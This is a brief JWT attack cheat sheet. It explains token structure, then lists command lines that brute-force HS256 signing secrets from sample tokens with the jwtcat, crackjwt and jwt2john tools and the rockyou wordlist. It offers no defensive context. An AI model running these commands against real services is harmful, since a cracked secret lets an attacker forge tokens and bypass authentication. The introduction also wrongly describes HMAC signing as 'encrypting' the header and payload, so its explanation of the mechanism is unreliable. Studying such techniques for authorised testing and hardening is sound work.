JSON Web Token is a compact mechanism used for transferring claims between two Endpoint to protect the integrity of the underlying message using a Message Authentication Code (MAC) encrypted. A JSON Web Token consists of three parts; an encoded Header, an encoded Payload and the Signature.
* The Header contains metadata, defines the type of token and the algorithm used for encryption of Payload.
* The Payload contains the claims to routes and services in value key pairs. 
* The signature is calculated by encrypting the base64UrlEncoded values of Header and Payload using a secret Key





### HMAC secretKey  Brute-force attacks Using Known Wordlist attacks
The algorithm HS256 uses the secret key to sign and verify each message. The algorithm RS256 uses the private key to sign the message and uses the public key for authentication

```
python3 jwtcat.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4 -w /usr/share/wordlists/rockyou.txt

python3 jwtcat.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.J8SS8VKlI2yV47C4BtfYukWPx_2welF34Mz7l-MNmkE -w /usr/share/wordlists/rockyou.txt

python3 jwtcat.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4 -w /usr/share/wordlists/rockyou.txt

python crackjwt.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4 /usr/share/wordlists/rockyou.txt

python jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4  > jwt.john

```
